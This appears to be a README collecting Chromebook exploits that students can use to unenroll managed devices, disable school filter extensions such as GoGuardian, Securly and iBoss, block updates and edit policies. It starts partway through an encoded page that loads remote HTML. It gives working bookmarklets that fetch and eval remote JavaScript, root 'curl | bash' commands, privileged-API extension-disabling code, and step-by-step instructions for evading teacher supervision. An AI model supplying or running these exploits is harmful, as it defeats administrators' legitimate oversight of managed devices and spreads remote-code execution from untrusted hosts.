goCPDqGko9nZSZS%2Bi5rrWjrJG91pCqy2YmAi8v6hlhatcZ2gmwvKJNEIB0IHBEQUQK1QuBHboQ8G6q0b4iFgXssfsDu%2FelAVdaREwjwwrR18GqZXRzPCRLnSKHjBOpVdKVVF3oUAkch0AnCaaVPORW%2BxvtH6PxDrGTc9%2FwoP2DnKEJOTgwZ2YixEOCD%2BxdI0DN6QH%2B2eUMzRw30XfIVsRidsh1laxRd2S4t%2Fnw3VjKnEOGUgHgWwNMdouOF9qp2s3FtM6az74jFSAw%2BqPDzjKEiK844AhzbD4SnCfRMpCqyFSJDJrk2kfAlsQxyVYfuI9DtNtsli2UnAnUAniHQ001VTfXZ2YQBrX1LrMraykBPrIcdH6uyGWCpuykE9kHBTZF3RVpM5c6CTL4llrHf2lq2UFEU%2FhXjKIIy5SYCz4iouCUdJ3XphM%2FXxGIgtG3alRB4yfYTQOlEU9ZlCQEBcXd4U%2Fhfsm3%2FZKaRvieWQa7t2h0gfM9Mg3IgD4cnYAcXjlKfq6lPkPhMeHP4F7nawKwg1uDM9ajjd40z04tsCNQ%2BGKP1jCBxnBTiv8%2FwhSUJahW6OIUETkeujDCpwPvLvv6%2BGwi0hYhu9LFzix1Ej0HHhyPvjuywUzhbymQNsfhtrf7u%2FhoAFb4El9AMgXuJ6BgUnCaF3kpQ4vSBdx3ocKKv4QAqdI4jvgWEdzmR5YOy1QEl8Il979rHPyw5nbKGWNwL5TXlK0VC7HT0YLj73XlcCPH1eX3zHnz1mlc99T4y2h8XWyDwSQCL3W%2BKJxLPENEjilAeDleF7UU79kQtb4VmFbEG91vvBeHzAuJSAl3iLTzjSu8k0HeCU4Lf3XfpPnY2T18iiLJtZVerQt1Cgj426EWWvvpT16QT6AUmU%2Bxs7JkD7zvgc9%2Fh1A2ymiPriDW0gZfUXjIjGAuuFRBrBQmO%2F752cKnILoteJXble6A%2F3v%2BNA1ce4Ec4M5oqaysn90R7PgqBLQDeM%2BhPnCmdDkLg4YAI%2FHQiLPfGAzmriTVaw0KNoSDOIQRgHQm6lL8B8PeMwcgLHD5%2FaHpz2F%2BE4wLivC2arui8RzKCNwoSugLlV246xLnJgDU71hT36%2F03gbBAQMwjQUUCYjqBFgHg5yOmu1nfoCw2in2CQA83VTW95oH8rBSZc8TKyl5Io9Ll28uXgjANAnMUKEy4aTp0JiA%2FLTEdhGISNEuQ4B%2BiJeNY51Tz7CT6xKO5drnrRndIYrmBYg7LCL0SmqoX6HOhYwEEpkNgPiVox%2F5379%2Bfw8123DRJLMcQSgESgZEISGLJUSER8AABSSwPQJUiJQKSWHIMSAQ8QEASywNQpUiJgCSWHAMSAQ8QkMTyAFQpUiIgiSXHgETAAwQksTwAVYqUCEhiyTEgEfAAAUksD0CVIiUCklhyDEgEPEBAEssDUKVIiYAklhwDEgEPEJDE8gBUKVIiIIklx4BEwAMEJLE8AFWKlAhIYskxIBHwAAFJLA9AlSIlApJYcgxIBDxA4P8DwBHwfEBEJz8AAAAASUVORK5CYII%3D%22%3E%0A%20%20%3Cscript%3E%0A%20%20%20%20document.addEventListener(%22DOMContentLoaded%22%2C%20()%20%3D%3E%20%7B%0A%20%20%20%20%20%20const%20main%20%3D%20%22https%3A%2F%2Fraw.githubusercontent.com%2FBlobby-Boi%2FExtHang3r%2Frefs%2Fheads%2Fmain%2Findex.html%22%3B%0A%20%20%20%20%20%20const%20fallback%20%3D%20%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FBlobby-Boi%2FExtHang3r%2Findex.html%22%3B%0A%0A%20%20%20%20%20%20fetch(main)%0A%20%20%20%20%20%20%20%20.then(response%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20if%20(!response.ok)%20throw%20new%20Error(%22Primary%20URL%20failed%22)%3B%0A%20%20%20%20%20%20%20%20%20%20return%20response.text()%3B%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20.catch(()%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20return%20fetch(fallback).then(response%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(!response.ok)%20throw%20new%20Error(%22Fallback%20URL%20failed%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20response.text()%3B%0A%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20.then(html%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20document.open()%3B%0A%20%20%20%20%20%20%20%20%20%20document.write(html)%3B%0A%20%20%20%20%20%20%20%20%20%20document.close()%3B%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%7D)%3B%0A%20%20%3C%2Fscript%3E%0A%3C%2Fhead%3E%0A%3C%2Fhtml%3E
```
2. Enjoy! Keep the page open if it switches back on for some reason.

[**🔼 Back to top**](#ext-remover)

## CryptoSmite *Unenrollment*

**CryptoSmite** is an exploit capable of completely unenrolling enterprise-managed Chromebooks. It was found by FWSmasher and released on **March 9th, 2024**.

**This exploit has been patched since Chrome OS 120.**

### Finding Kernver
If you're on v120 or higher, you need to downgrade to use CryptoSmite. To do this, you first need to check your `kernver=` in Recovery Mode.

1. Boot into Recovery Mode
   - Hold ESC + Refresh + Power for 2 or 3 seconds.
   - You should be on an "Insert Recovery Media" or "Let's step you through the recovery process" screen.
2. Press TAB and look at the last digit of the `kernver=` line

If:
- `kernver=` ends with a 2: <br />
Congratulations, you can downgrade to v119 or lower! Follow the instructions at [Downgrading *Change versions*](#downgrading-change-versions) on how to downgrade.

- `kernver=` ends with a 3 or higher: <br />
Sorry, you can't downgrade to v119 or lower. Wait for a new unenrollment exploit or do a [**dangerous** hardware modification.](https://blog.darkn.bio/blog/3-the-tsunami)

### Using CryptoSmite
1. Download a SH1MMER prebuilt image here: [dl.darkn.bio](<https://dl.darkn.bio/SH1mmer/Prebuilt/>)
2. Disable OS verification *(blocked or not, doesn't matter)*, and boot into the shim.
3. Navigate to Payloads and navigate to CryptoSmite using the arrow keys, then press `Enter`.
4. Type in `Y`, then press enter, and it'll automatically reboot upon completion.
5. Proceed through the setup partially till you get to the Add Account Screen.
   - If you see an update prompt, reboot it and then press `CTRL + ALT + E` on the Wi-Fi screen.
     - This *should* allow skipping the update or make it not appear at all.
6. Powerwash the Chromebook at the "Add Account" screen. Afterwards, it'll be fully unenrolled.

### Further Reading
- [Repository](https://github.com/FWSmasher/CryptoSmite)  
- [Writeup](https://blog.coolelectronics.me/breaking-cros-2/)
- [Official Blogspot](https://exploitingchromium.blogspot.com/)

[**🔼 Back to top**](#ext-remover)

## SH1MMER *Unenrollment*

**SH1MMER** is an exploit capable of completely unenrolling enterprise-managed Chromebooks. The Mercury Workshop team found it and released it on Friday, January 13th, 2023.

Due to the detail this exploit requires, please check out the official website: [sh1mmer.me](https://sh1mmer.me)

**This exploit has been patched since Chrome OS 111.**

### Note

Mercury Workshop received a notice from Google™️ that they had to take down their builder and shims. Currently, multiple community members are rehosting it.
- [Wax4Web](https://darkn.bio/sh1mmer/builder)
- [RMA shims](https://dl.darkn.bio/SH1mmer)
- [Prebuilt shims](https://dl.darkn.bio/SH1mmer/Prebuilt)

### Further Reading
- [Repository](https://github.com/MercuryWorkshop/sh1mmer)  
- [Official Website](https://sh1mmer.me/)
- [Writeup](https://blog.coolelectronics.me/breaking-cros-2/)

[**🔼 Back to top**](#ext-remover)

## Hapara Focus Session Bypass

### What is it?

An exploit that allows for access to sites outside of the Hapara Focus Session

### How to use it?

**Your teacher may be able to still see your screen, but they won't think you are doing anything wrong because of the focus session.**

**YOU MUST NEED data: LINKS ALLOWED, IF YOU DON'T HAVE THOSE ALLOWED, THIS WILL NOT WORK**.

1. create a bookmark named anything, head to the URL section, and paste this in it: `data:text/html,<!DOCTYPE html> <html> <head> <title>full screen iframe</title> <style type="text/css"> html { overflow: auto; } html, body, div, iframe { margin: 0px; padding: 0px; height: 100%; border: none; } iframe { display: block; width: 100%; border: none; overflow-y: auto; overflow-x: hidden; } </style> </head> <body> <iframe src="https://www.google.com?igu=1" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="100%" scrolling="auto" id="google"> </iframe> </body> </html>`
2.  when you are in a focus session, click the bookmark, and it will open a Google tab. (If it says that it doesn't work, then you can download the [Iframe](https://github.com/3kh0/ext-remover/blob/main/HaparaBypass-Iframe.html)
3.  enjoy not having to listen to a lecture from your teacher!
(Credit to [Hero Link 6](https://github.com/HeroLink6) For finding this exploit, you can find more info on his GitHub repository [here](https://github.com/HeroLink6/Hapara-Focus-Session-Bypass/tree/main).)

[**🔼 Back to top**](#ext-remover)

## GuardianTabCrash *Unrestricted browsing*

### What is it?

An exploit that allows for unrestricted internet access outside of GoGuardian's control

### How to use it?

**Teachers can still see your screen, but they can't block or close any of your tabs.**

**YOUR TEACHER NEEDS TO HAVE SET A TAB LIMIT. TRY OPENING TONS OF TABS TO CONVINCE THEM TO ENABLE TAB LIMITS**.

1. create a bookmark named anything: `javascript: window.onbeforeunload = ()=>{return false;}`
2. Hold down CTRL and then SPAM CLICK the bookmark until you're well above the tab limit, opening a bunch of `about:blank` pages.
3. It might ask if you want to leave this page. This is GoGuardian trying to close it. Say No, and click `Prevent from creating additional dialogues`.
4. Enjoy your unblocked stay!

#### Discovered by @py660

[**🔼 Back to top**](#ext-remover)

## Skiovox *Unrestricted browsing*

### What is it?

An exploit that allows for browsing within a completely unblocked Chrome
browser. It works on ChromeOS 118 and a wide range of previous versions.
- Skiovox utilizes a bug in kiosk apps
- Very similar to a bug from 3 years ago
  
Within the unblocked browser, you can
- Install extensions
- Bypass pretty much all blocks
- Do whatever the honk you want

### How to use it

Bypassi made a wonderful slideshow for you goofballs to follow and view using any of the links below!

- https://www.skiovox.com/skiovox.pdf
- https://drive.google.com/file/d/1tl8eP26MFRejHO38H5HwMLl2VaQrtn0Z/preview
- https://ftp.3kh0.net/Archive/skiovox.pdf
- https://1drv.ms/b/s!Ais5N3vPLTEMh8poZbywnNWdMUrhUA?e=MaCHBx
- [`img/skiovox.pdf`](img/skiovox.pdf)

### Further Reading
- [Skiovox helper](https://github.com/bypassiwastaken/skiovox-helper)

[**🔼 Back to top**](#ext-remover)

## LTBEEF *Disable extensions*

LTBEEF (Literally The Best Exploit Ever Found) is an exploit found by Bypassi (Bypassi#7037) in September 2022 and is a great way to disable spyware installed on your Chromebook by your school.

### How to use LTBEEF

Use either of the two bookmarklets below. The instructions are the same for both.

1. Copy the Javascript code from either of the two bookmarklets below
2. Make a new bookmark on your Chromebook
3. Put the Javascript code in the URL section of the bookmark
4. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
5. If that page does not work, you can just change the end of the URL to anything else, like https://chrome.google.com/webstoreYAAAAAAAAAAAAAAAY
6. Click on the bookmark you made
7. Switch off the extensions you don't want to have anymore.
8. You're done! The extension should now be disabled. 

**Please note that this exploit has been patched for quite some time**

### Bookmarklets

#### CompactCow GUI

![compactcowgui](img/compactcow.png)

```js
javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
```

#### Ingot

![ingot](img/ingot.png)

```js
javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
```

[**🔼 Back to top**](#ext-remover)

## LoMoH *Disable extensions*

Formerly named "Locked Mode Hack," this Chrome OS exploit uses the locked mode feature to soft disable force-enabled extensions on managed accounts (Excluding Hapara Highlights and Read&Write if installed).

**This exploit is patched in Chrome OS 111**

### Bookmarklet Version (Original and nicer)
```
javascript:(function(){if (location.hostname == "docs.google.com") {document.body.innerHTML = document.body.innerHTML.replace("Locked mode is on", "Are you ready to turn off extensions?%22);%20document.body.innerHTML%20=%20document.body.innerHTML.replace(%22You%20have%20already%20opened%20and%20closed%20this%20quiz.%20Opening%20this%20quiz%20again%20will%20notify%20the%20form%20owner%20by%20email.%22,%20%22This%20will%20reload%20all%20tabs%20in%20your%20browser%22);%20var%20button%20=%20document.getElementById(%27mG61Hd%27);%20button.innerHTML%20=%20button.innerHTML.replace(%22Start%20Quiz%22,%20%22Disable%20Extensions%22);%20button.addEventListener(%27click%27,%20function(event){window.close();})}%20else%20{window.open(%22https://docs.google.com/forms/u/0/d/e/1FAIpQLSf5EYwrSUjmQhBOasMpORZy80eBCYb7qCpEwWNoRPUGyObGMA/startquiz%22);}})()
```

### Website/HTML Version (for blocked bookmarklets)
[LoMoH HTML](https://ashtondavies.github.io/LoMoH?unlock)
**Additional Notes:**
You must create your link with the button on the page for locked mode to work within your organization/district.
If this is patched for you, you will get rickrolled attempting to perform this exploit. This is just a heads-up for those who do happen to read this.

[GitHub Repository](https://github.com/AshtonDavies/LoMoH)

[**🔼 Back to top**](#ext-remover)

## LTMEAT *Disable extensions*

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

1. Find a page belonging to the extension you want to disable. `chrome://extensions`, `chrome://extensions-internals`, and `chrome://process-internals` are all good places to find your extension's ID (a 32-character lowercase string). You can also do a simple Google search. Once you have your ID, substitute it into the hostname in the URL below:

```
chrome-extension://extensionidhereblahblah/manifest.json
```

For some filters like Securly, the block screen is already an extension page. 

2. Bookmark the extension page (bookmark A) if you wish. Then, bookmark `chrome://kill` (B) and `chrome://hang` (C). 
3. On the extension page (A), click the `chrome://kill` bookmark (B). The page should crash. You should already have the next step prepared. 
4. Instantly start spamming `chrome://hang` (bookmark C) and quickly reload the page while spamming (ideally with the refresh key on your keyboard or `ctrl`+`R`). You should have reloaded within one or two seconds of killing the page. 
5. If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs, and the extension will be dead. If nothing loads, you probably reloaded too late or spammed too slowly. This isn't rocket science! Restart your computer to revert back to normal. 

Exploit made by [Bypassi#7037](https://buymeacoffee.com/bypassi), [learn why this works](https://ltmeat.bypassi.com).

### "Help me! I'm an idiot!"

I had far too much faith in society when making this page. Some of you skids out there are really, really stupid and also can't read. So here are the answers to some commonly asked questions. 

**How do I get an extension ID?**

Okay, fair. Extension IDs are leaked in a couple of places. Generally, the best way to get them is to go to extension settings and copy the URL query value.

**It says blocked by client?**

That's the message you get when you try to visit a page belonging to an extension that doesn't exist. The error message (`ERR_BLOCKED_BY_CLIENT`) is highly misleading. Nobody blocked it. You need to find the correct extension ID (see above).

If you got this because you tried to visit the `extension_id_here` example URL, you should be extremely ashamed of yourself. Please change and grow as a person.

**I don't have a bookmarks bar!!!!**

First, try running ctrl+shift+B. If that doesn't work, go to `chrome://settings` and turn on the "home button" feature, then set it to `chrome://hang`. A home icon in the top left should appear to the right of your refresh icon. Use that instead of bookmark C.

There is a version where you don't need bookmarklets, but I am currently gatekeeping it (L). Check this site daily to see if new alternate instructions have been posted. 

**I disabled an extension, but now I can't load websites!**

If you just read the write-up, you'd know this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.

Anyway, no listeners mean you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you needed to be spamming bookmark C faster. The most reliable fix is to restart your computer and try again. Try to match the pace of the gif below: (note the reload) 

![image](img/abc.gif)

**The bookmarks don't do anything when I click them!**

Might be admin-blocked. Either be smart enough to figure out another way or check this site daily to see if new alternate instructions have been posted.

**I disabled the extension. Why is some stuff still blocked?**

I have bad news for you... not all filters are Chrome Extensions. Again, make sure the extension pages (like bookmark A) are frozen before you assume that your skiddy self successfully did the exploit. 

[Baby method for slow people](https://ltmeat.bypassi.com/alt/1.txt)

[**🔼 Back to top**](#ext-remover)

## LTMEAT Flood *Freeze extensions*

1. Create a bookmark folder and paste the extension page many times. (About 800 minimum is recommended, assuming your Chromebook is average school quality) You should add the extension page at the beginning of the folder.
2. Right-click and open all in a new window.
3. Close the window with all those tabs.
4. Open the folder in a new window again, and Chrome should hang those tabs to take care of the old ones in the background that were just closed. (Equivalent to the duplicate tab step in Bypassi's method)
5. Flip the Allow access to file URLs switch in the extension settings, and then you've bypassed the patch, and the exploit is working.

Close everything and you're good to go. If it didn't work, try adjusting the number of open tabs. This is the LTMEAT Flood Method, and also unofficially called Alternate Method # 2. Enjoy a much longer life of LTMEAT!

**Not working?** Ensure you open a large set, but not too large, of extension tabs (_/generated_background_page.html or /manifest.json) for a permanent freeze.

[**🔼 Back to top**](#ext-remover)

## Temp TMEAT *Freeze extensions*

A method of using LTMEAT that does not require `chrome://` URLs. This works by using 80-150 tabs to soak up memory.

1. Create a bookmark with the link `chrome://extensions/?id=extension_id_here` and name it `Kill switch`.
2. Create a new bookmark folder. Name it `spam.js`. Next, paste this link into your browser: `chrome-extension://extension_id_here/background.js`
3. Then right-click on your folder and hit `Add Page`. Press Enter.
4. Right-click on the folder again and hit `Bookmark Manager`. You should see your page. Click on it and hit `Ctrl`+`C`. Press `Ctrl`+`V` until you have 38 of them.
5. Go to a new tab and right-click your folder. Press `Open All (38)`.
6. Repeat step 3, then click on one of the tabs from this batch. Wait until the `This page is taking too long` popup appears. This will take 30-60 seconds. If it doesn’t, do `chrome://restart` and go back to step 2. Add 3-4 more pages to the folder.
7. Once the popup happens, right-click on one of the tabs closest to the right of the screen and hit `Duplicate`. Then, go to your `Kill switch` bookmark and look for a switch to flip, `Allow Access to File://URLs`. Then, click on the leftmost extension tab (one that opened from the main.js folder) and click `Close all tabs to the right`. KEEP THIS TAB OPEN!!!

Tips: Go to `chrome://settings/performance` and turn Memory Saver off, and in the box where it says `Keep these sites always active`, paste in the extension URL. I’ve noticed clicking on one of the tabs from the second batch seems to help with reliability.

[**🔼 Back to top**](#ext-remover)

## Baby LTMEAT *Freeze extensions*

BABY METHOD
FOR THE TECHNOLOGICALLY CHALLENGED.

1. Follow step one of the original instructions to find a page belonging to the Chrome extension you want to disable.
2. Visit that `chrome-extension://extension_id_here` page, then type `chrome://hang` in the URL bar of that tab. It should start loading infinitely.
3. Right-click the tab and duplicate it. Don't close anything.
4. Go to the `chrome://extensions` page for the blocker extension you want to Disable.
5. If that page has any switch, such as `Allow access to file URLs`, click that switch. If you don't see any clickable switches, this exploit will not work
6. The extension should now be broken, assuming you clicked the switch! Only one of the two duplicate tabs should be left standing. You can close your tabs now.

[**🔼 Back to top**](#ext-remover)

## LTMEAT Print *Freeze extensions*

1. Find your extension's largest file. This can usually be found by using [Rob Wu's crxviewer](https://robwu.nl/crxviewer/)
2. Go to that page and run `Ctrl`+`P`. A print window should show up, with several pages in the top right.
3. Do everything you can to increase that number. Shrink down margins, change layout to landscape, anything you can. The higher you get that number, the longer the effect will last.
4. Reload. The page should start hanging.
5. Go to your extension's settings page, `chrome://extensions`.
6. Duplicate your "printing" tab, and go back to your extension's settings page.
7. Flip any switch you can find there. Usually, there'll be one titled `Allow access to file URLs`.

### Where do I find my extension's manifest.json?
First, find your extension's ID. This is a 32-character code found on your extension's settings page, normally near or at the top. 

![Where do I find my extension ID](img/find_ext_id.png)

Then go to `chrome-extension://extension_id_here/manifest.json`

Credit to Bypassi for the original LTMEAT framework, and to Swordmaster4321 for discovering that pages can be hung with printing.

[**🔼 Back to top**](#ext-remover)

## Dextensify *Freeze extensions*

Dextensify is an exploit that lets you disable most admin-installed Chrome extensions from any webpage. It can be used from regular websites, HTML files, and data URLs.

Go here and follow instructions: <a href="https://dextensify.pages.dev/main">Dextensify Main HTML</a>, or download the file here [Dextensify.html](Dextensify.html)

Download mirror: [ftp.3kh0.net](https://ftp.3kh0.net/Archive/Dextensify/)

Made by <a href="https://ading.dev/">ading2210</a>

[**🔼 Back to top**](#ext-remover)

## JPCMG *LTBEEF w/ Service workers*

**Requirements**
- `chrome://serviceworker-internals`
- Inspect element

1. Go to `chrome://serviceworker-internals`
2. Find your extension, this exploit will not work if you can't find it. Some extensions will not work with this exploit.
3. Hit the start button then the `Inspect` button, and execute the LTBEEF code
```js
chrome.management.setEnabled('extension_id_here',false)
```

![Screenshot example](img/jpcmg.png)

Thanks to Nyaann#3881 for this exploit

[**🔼 Back to top**](#ext-remover)

## Corkey *Corrupt extensions*

Corkey does indeed include power washing the Chromebook, which wipes local data including everything under "My files," so I suggest you select everything you want to drag and back up to Google Drive if that's available for your account.

1. Esc+Refresh+Power and re-enroll (Enter recovery page), or you can just powerwash.
2. Log into your Chromebook and immediately turn off WiFi and do refresh+power to instant-restart.
3. Log back into your Chromebook with the WiFi off. Look for an option to log in as an existing user and click that.
4. Go to `chrome://extensions`, turn on WiFi, and wait for your school's blocking extension to appear.
5. As soon as it appears, turn off WiFi and restart as fast as possible.
6. Log back in, go back to extensions, and wait. If it says your blocking extension could be corrupted or doesn't appear at all, then it worked (wait at least a minute with a close watch in case it comes back.)
7. If it didn't work, start over. You have to be fast.

[**🔼 Back to top**](#ext-remover)

## Extension Launcher *Install extensions w/o allowlist*

A bookmarklet capable of installing extensions, for those without an allowlist.

### Requirements
1. Access to the Chrome Web Store
2. A Chromebook without allowlist
3. Bookmarklets enabled

### Instructions

1. Go to [`ext-launcher-bookmarklet.js`](ext-launcher-bookmarklet.js) and save the code as a bookmarklet.
2. Go to [The Chrome Webstore](https://chrome.google.com/webstorex) and use the bookmarklet
3. Then put the icon of the extension, the ID, and the name of it (This does not matter, you can put anything), then press download, and it will work.

### Extra Notes
- This will not work if you have a blocklist, this is only for extensions that aren't on the allowlist
- Credit to "Aka, but nice" on Discord.

[**🔼 Back to top**](#ext-remover)

## Point-Blank *Execute scripts on extension pages*

This exploit allows you to execute scripts on extension pages, this is a great example of how Chromebooks are a piece of garbage.

### Requirements
1. Bookmarklets enabled
2. Access to a working brain

### Getting started

1. Go to [`newpointblank.js`](newpointblank.js) and save the code as a bookmarklet on your Chromebook.
2. Now find your blocker from the list below.

### Blockers

#### Securly

[Go to this page](https://tinyurl.com/bettergoofcurly)

If it says blocked by Chrome, reload (you have to actually have Securly ofc)

#### iBoss

[Go to this page](https://tinyurl.com/goofboss)

#### Cisco Umbrella

[Go to this page](https://tinyurl.com/goofumbrella)

#### Blocksi

[Go to this page](https://tinyurl.com/goofsi)

#### GoGuardian

[Go to this page](https://tinyurl.com/goofguardian)

If your school updated GoGuardian, this exploit may not work.

### Extra Notes

- Now most of these links are a block page (this is intentional) 
- Each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made 
- Click either hard disable or soft disable, soft disable will only disable it until you restart your Chromebook.
- You can also run some of the scripts and run your own code, your extension may disable javascript running on it, so running your own code may not work.
- I recommend doing soft disable, which only disables it until restart. 
- The idea was from <a href="https://bolg.glitch.me/_/point-blank/">Bypassi#7037</a>

[**🔼 Back to top**](#ext-remover)

## UBoss *Tamper with IBoss*

This works only for iBoss, and Blocksi, If you don't have one of these, use New Point Blank.

### Requirements
- Bookmarklets enabled
- Access to a working brain

### Getting started
1. Go to the corresponding link for your blocker below.

iBoss: [tinyurl.com/byeswamp](https://tinyurl.com/byeswamp)

Blocksi: [tinyurl.com/blockboss](https://tinyurl.com/blockboss)

Then bookmark the code below:

```js
javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})})`) && close();
```
2. Then go to the site with your blocker that was listed above.
3. Run the code. Follow the instructions there.

If it doesn't work let us know by creating a discussion, this was made in partnership with `akabutnice` and `bypassi`.

[**🔼 Back to top**](#ext-remover)

## CAUB *Prevent Updates*

This exploit keeps your Chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your Chromebook that the WiFi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates. 
### Note
Do **_NOT_** leave your Chromebook on a new WiFi network for more then a day without redoing the process unless you also have CAUB Flags. Even if you do have both, it can't hurt to be safe when taking your chromebook somewhere new.

### Requirements
- Access to `chrome://network#state`

### Getting started
1. Go to `chrome://network#state`.
2. Scroll to the bottom of the page. You will see a list of WiFi that you have connected to before.
3. Click the `+` sign next to the WiFi name of each network that you commonly connect your Chromebook to.
4. We are going to make it so that when the Chromebook is connected to those networks, it will not check for updates.
5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
6. Go to [caub.glitch.me](https://caub.glitch.me/).
7. Paste the copied text into the textbox below.
8. Press the `generate onc` button below the textbox.
9. Once you have downloaded the file, go to `chrome://network#general`.
10. Click on the `import ONC` button.
11. Import the newly-downloaded file.

**Extra notes**
- Your Chromebook will no longer automatically update. (as long as you are on a wifi that you CAUBed)
- Be careful not to stay on wifi for too long without using CAUB on it, otherwise, you might update.
- We cannot guarantee that this will work on every wifi, but it should work on most.

[**🔼 Back to top**](#ext-remover)

## CAUB Flags *Prevent Updates*

This alt exploit keeps your Chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by <a href="https://github.com/MechaXYZ">MechaXYZ</a>. Using a Chrome flag, you can convince your Chromebook not to automatically update.

### Requirements
- Access to `chrome://flags`

### Getting started

1. Go to `chrome://flags#show-metered-toggle` or search "metered" in `chrome://flags` instead.
2. Enable it and restart your device.
3. Open the Settings app.
4. Go to your Network >> Advanced >> Show metered toggle and turn it on

**Extra notes**
- Your Chromebook will no longer automatically update. (as long as you have the flag enabled)
- And you must be able to enable flags if it ain't blocked otherwise, this exploit won't work

[**🔼 Back to top**](#ext-remover)

## Blank3r

Blank3r is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.

### Requirements
- Bookmarklets enabled

### Getting started
1. Bookmark this code:

```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
```
2. Navigate to `chrome://extensions`.
3. Click on an extension that YOU installed from the Chrome Web Store > Details.
4. In the URL bar, copy the string of letters and numbers after the `/?id=`.
5. Click "View in Chrome Web Store" and spam the escape key. If it loads into Chrome Webstore try again, if it is a blank screen click the bookmarklet.
5. Paste the ID of the extension into the prompt separated by commas.

If you close the tab, the exploit will stop working.

[**🔼 Back to top**](#ext-remover)

## Downgrading *Change versions*

Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, such as LTBEEF, SH1MMER, or CryptoSmite. This is a built-in feature of ChromeOS.

Please do note that depending on your `kernver=` you may not be able to downgrade to certain versions. More info can be found at the [Finding Kernver](#finding-kernver) section.

### Requirements
- A USB thumb drive with at least 8GB of storage, however 16GB (or more) is recommended.
- A personal computer with access to downloading the Chromebook Recovery Utility.

### Setup

1. Navigate to `chrome://version` on the Chromebook you wish to downgrade. If that is blocked try `chrome://system/:~:text=CHROMEOS_RELEASE_DESCRIPTION`, and check for your board under `Platform`. For me, that would be octopus.

![chrome://version](img/chromeos-check-board.png)

2. Navigate to [chrome100.dev](https://chrome100.dev/) , press `ctrl+f` and type in your board.
3. Find and download the Chrome version you want to your personal computer.

### Downgrading
1. Install [Chromebook Recovery Utility](https://chromewebstore.google.com/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm) onto your personal computer.
2. Open the extension, click on the settings button in the top right-hand corner, and click "Use local image".
3. Select the recovery image you downloaded from chrome100.
4. Plug in the USB you wish to use, and follow the prompts on the screen.
5. On your Chromebook, press esc+reload+power and follow the prompts.
6. On the checking for updates screen or Wi-Fi selection screen, press `ctrl`+`alt`+`e` to skip the "checking for updates" screen.

[**🔼 Back to top**](#ext-remover)

## Pollen *Policy Editor*

chromeOS User Policy Editor

### Requirements
- Devmode **NEEDS** to be enabled.

### Getting started

There are two modes for this, I recommend just using the first one.

#### Normal

1. Open Crosh (Ctrl+Alt+T)
2. Run the following commands:
```sh
shell
sudo su
curl -Ls https://mercuryworkshop.github.io/Pollen/Pollen.sh | bash
```
3. Done! It may take a few seconds for the new policy to apply. If it does not apply, press `alt+vol_up+x`.

#### PollenFS (RootFS)

Disabling RootFS **will** Soft-Brick your Chromebook when booting back into normal mode.

1. Open Crosh (Ctrl+Alt+T)
2. Run the following commands:
```sh
shell
sudo su
curl -Ls https://mercuryworkshop.github.io/Pollen/RootFS.sh | bash
```
3. Reboot
4. Go Through Steps 1-3 Again
5. Run the following command:
```sh
curl -Ls https://mercuryworkshop.github.io/Pollen/PollenFS.sh | bash
```
6. Done! Your Pollen configuration is now permanently applied!

### Further Reading
- [Repository](https://github.com/MercuryWorkshop/Pollen)

[**🔼 Back to top**](#ext-remover)

## Killcurly *Break extensions*
Kill extensions by signing out.

1. Visit `chrome://settings/signOut`.
2. If you are on the right version, there should be a big blue button. Press it.
3. Open a new tab and type in `chrome://restart`, then press enter.
4. Now visit `tinyurl.com/AddSession` or [this link.](https://accounts.google.com/signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession)
5. Add your **SCHOOL** account back. It WILL NOT WORK if you add a home account back. This is just so you can still access Google Drive, YouTube, and any Google service.

Alternate method (unpatched)
1. Visit chrome://settings/content/all
2. Find google.com
3. Click trashcan button
4. Click delete
5. Go to chrome://extensions and find securly (or whatever other ext)
6. Click the allow access to file urls switch
Now you can go to the link and add account back if you want, but not necessary.

All of your extensions should stop working. Note that you must repeat this every time you restart or sign out. 

Method 1 is patched on Chrome versions 112 and above. Method 2 remains unpatched. Credit to Zoroark for method 1 and schoolexploitkid for method 2.

[**🔼 Back to top**](#ext-remover)

## Shimboot *Boot Linux*

Shimboot is a collection of scripts for patching a Chrome OS RMA shim to serve as a bootloader for a standard Linux distribution. It allows you to boot a full desktop Debian install on a Chromebook, without needing to unenroll it or modify the firmware.

For more detailed information, please see the project's [README](https://github.com/ading2210/shimboot).

